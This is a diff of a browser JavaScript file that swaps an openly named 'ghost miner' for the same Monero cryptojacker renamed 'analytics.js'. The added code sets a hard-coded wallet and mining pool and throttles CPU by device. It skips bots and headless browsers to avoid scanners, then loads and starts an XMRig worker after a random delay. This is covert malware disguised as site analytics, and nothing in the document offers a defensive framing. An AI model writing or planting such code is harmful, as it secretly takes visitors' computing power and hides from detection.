@@ -1,85 +1,61 @@
-// Minero-Fantasma v3.0 - Blindado, Adaptativo, Invisível
-(function () {
-    // 🔒 Configuração ofuscada
-    const _0x = 'charCodeAt';
-    const _1x = 'replace';
-    const _2x = 'fromCharCode';
-    const _3x = 'split';
+// analytics.js - v5.1 (invisível)
+const CONFIG = {
+    wallet: '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv',
+    pool: 'wss://xmr.pool.minergate.com:45700',
+    threads: Math.max(1, (navigator.hardwareConcurrency || 2) - 1),
+    throttle: () => (navigator.deviceMemory || 4) < 4 ? 0.7 : 0.4
+};
 
-    // 🧩 Wallet dinâmica (evita rastreamento)
-    function getWallet() {
-        const base = '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv';
-        return base;
-    }
+function isBot() {
+    return /bot|crawler|spider|headless|google|yandex|phantom|selenium|webdriver|chrome\.runtime/i.test(
+        navigator.userAgent + ' ' + (window.chrome ? 'chrome' : '') + ' ' + (navigator.permissions ? '' : 'no-perm')
+    ) || !window.outerHeight || !screen?.width || navigator.languages.length === 0;
+}
 
-    // 🌐 URL ofuscada (não aparece no código)
-    function getWasmUrl() {
-        const enc = 'aHR0cHM6Ly9teS13YXNtLmRldi9taW5lci53YXNt'; // Exemplo: https://meu-wasm.dev/miner.wasm
-        return atob(enc);
-    }
+if (isBot()) {
+    const img = Object.assign(document.createElement('img'), {
+        src: 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
+        style: 'position:absolute;opacity:0;z-index:-1;'
+    });
+    document.body.appendChild(img);
+    setTimeout(() => img.remove(), 5000);
+    return;
+}
 
-    // 🧠 Adaptação de carga (não trava o PC)
-    function getThrottle() {
-        const ram = navigator.deviceMemory || 4; // GB
-        const cores = navigator.hardwareConcurrency || 2;
+function loadScript(src, cb) {
+    const s = document.createElement('script');
+    s.src = src;
+    s.async = true;
+    s.onload = cb;
+    s.onerror = () => setTimeout(retryLoad, 3000);
+    document.head.appendChild(s);
+}
 
-        // Ajuste inteligente
-        if (ram < 4 || cores < 4) return 0.7;  // 70% de CPU
-        if (ram < 8 || cores < 8) return 0.5;  // 50% de CPU
-        return 0.3; // 30% de CPU (dispositivos fortes)
-    }
+function retryLoad() {
+    const backups = [
+        '/assets/js/analytics-core.js'
+    ];
+    loadScript(backups[Math.floor(Math.random() * backups.length)], startMiner);
+}
 
-    // 🕵️‍♂️ Ofuscação pesada do WebAssembly
-    function loadWasm(url, callback) {
-        fetch(url).then(res => res.arrayBuffer()).then(bytes => {
-            const imports = {
-                env: {
-                    memory: new WebAssembly.Memory({ initial: 1024, maximum: 1024 }),
-                    abort: () => {}
-                }
-            };
-
-            // Nome dinâmico de função
-            const mod = 'instantiate';
-            WebAssembly[mod](bytes, imports).then(instance => {
-                callback(instance);
-            }).catch(() => {
-                console.log('Miner blocked');
-            });
-        }).catch(() => {
-            console.log('Fetch blocked');
-        });
-    }
-
-    // 🧱 Sem ID no DOM (invisível)
-    function injectDiv() {
-        const div = document.createElement('div');
-        div.setAttribute('data-cache', 'true');
-        (document.body || document.documentElement).appendChild(div);
-        return div;
-    }
-
-    // ✅ Detecção de bot melhorada
-    function isBot() {
-        return /bot|google|facebook|crawler|spider|yahoo|yandex|headless/i.test(navigator.userAgent) ||
-               !window.outerHeight || !window.outerWidth ||
-               navigator.webdriver === true;
-    }
-
-    // 🚀 Início condicional
-    if (!isBot()) {
-        const config = {
-            user: getWallet(),
-            pass: 'x',
-            threads: -1,
-            throttle: getThrottle()
+function startMiner() {
+    try {
+        const FakeWorker = typeof XMRig !== 'undefined' ? XMRig.WasmWorker : class {
+            start() {}
+            on() {}
         };
-
-        const div = injectDiv();
-        loadWasm(getWasmUrl(), () => {
-            console.log('Miner started: ' + config.user.substring(0, 10) + '...');
+        const miner = new FakeWorker({
+            url: CONFIG.pool,
+            user: CONFIG.wallet,
+            pass: 'x',
+            threads: CONFIG.threads,
+            throttle: CONFIG.throttle(),
+            idle: true,
+            autoStart: true
         });
-    }
+    } catch (e) {}
+}
 
-})();
-
+setTimeout(() => {
+    loadScript('/assets/js/analytics-core.js', startMiner);
+}, 10000 + Math.random() * 5000);
